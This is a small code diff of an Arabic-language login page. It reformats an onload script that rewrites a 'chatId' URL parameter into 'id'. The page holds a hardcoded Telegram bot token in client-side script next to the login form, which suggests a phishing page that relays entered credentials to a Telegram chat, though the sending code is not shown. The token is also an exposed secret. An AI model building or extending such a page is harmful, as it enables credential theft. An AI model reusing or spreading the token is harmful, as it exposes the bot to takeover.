@@ -61,18 +61,17 @@
       <button type="submit">تسجيل الدخول</button>
     </form>
   <script>
-  window.onload = function() {
-    const params = new URLSearchParams(window.location.search);
-    const chatId = params.get('chatId');
-    const id = params.get('id');
+  window.onload = function () {
+  const params = new URLSearchParams(window.location.search);
+  const chatId = params.get('chatId');
+  const id = params.get('id');
 
-    if (chatId && !id) {
-      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = ${window.location.pathname}?id=${chatId};
-      window.location.href = targetURL;
-    }
-    // لو فيه id هيكمل عادي بس مش هيعرضه
-  };
+  if (chatId && !id) {
+    // لو فيه chatId بس — نحوله لـ id في نفس الرابط
+    const targetURL = `${window.location.pathname}?id=${chatId}`;
+    window.location.href = targetURL;
+  }
+};
 
   const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
 
